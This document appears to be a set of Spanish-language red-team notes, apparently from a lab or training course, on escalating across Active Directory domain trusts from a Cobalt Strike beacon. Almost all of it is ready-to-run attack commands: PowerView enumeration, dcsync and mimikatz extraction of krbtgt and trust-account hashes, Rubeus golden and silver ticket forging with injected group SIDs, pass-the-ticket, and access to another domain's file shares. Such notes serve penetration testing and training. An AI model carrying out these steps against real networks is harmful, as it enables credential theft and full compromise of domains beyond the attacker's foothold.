- Requiere tener **DOMAIN ADMIN** para poder saltar.

## **Parent/Child Trusts en Active Directory**

```powershell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

beacon> powerpick Get-DomainTrust
# 3. Enumerate basic info required for creating forged ticket
# Find the SID of Domain Admin / Enterprise Admin group of parent domain
beacon> powerpick Get-DomainGroup -Identity "Domain Admins" -Domain contoso.com -Properties ObjectSid

beacon> powerpick Get-DomainSID -Domain "dublin.contoso.com"

# Domain controller of parent domain
beacon> powerpick Get-DomainController -Domain contoso.com | select Name

# Domain Admin of parent domain
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Domain contoso.com | select MemberName
```

- Sacar clave **AES**
```powershell
beacon> dcsync dublin.contoso.com dublin\krbtgt
```

- Creamos un Ticket para que valga en el dominio padre
```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /outfile:C:\Users\Attacker\Desktop\golden

beacon> kerberos_tiket_user $RUTA

beacon> jump ...
```


## **One-Way Inbound Trusts**

- No hace falta admin, solo **medium console**

```powershell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-DomainTrust
#Ver dns del que confia
beacon> powerpick Get-DomainComputer -Domain partner.com -Properties DnsHostName

# 2. Check if members in current domain are part of any group in foreign domain
# Enumerate any groups that contain users outside of its domain
beacon> powerpick Get-DomainForeignGroupMember -Domain partner.com
# Verify the username from SID returned in previous step
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120

beacon> powerpick Get-DomainController -Domain partner.com | select Name

#Sacas el AES del krbtgt del dominio que confia
beacon>  execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> dcsync contoso.com CONTOSO\PARTNER$
```

- Creamos un Ticket para que valga en el dominio padre
```powershell
#SID el de mi user, group lo que esta despues del "-" en el SID
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:[NTLM HASH] /nowrap


beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:[TICKET] /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]

beacon> ls \\par-jmp-1.partner.com\c$
```

## **One-Way Outbound Trusts**

- Hace falta **ADMIN**

```powershell
# 1. Ver el tipo de confianza
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
beacon> powerpick Get-DomainTrust

# 2. Sacar el ObjetGUID del domino en el que confiamos.
beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

#Sacamos el ntml/rc4 hash, SACA EL PRIMERO
beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
```

- Creamos un Ticket para que valga en el dominio padre
```powershell
#Sacamos el usuario y vemos que esta partner.com = PARTNER$ = DOMAIN
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

#SID el de mi user, group lo que esta despues del "-" en el SID
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM  /rc4:$RCA /nowrap

#NECESITAS HIGH BEACON
beacon> make_token CONTOSO\PARTNER$ FakePass

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:$TIK

#Prueba a enumerar el nuevo dominio:
beacon> ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com
```



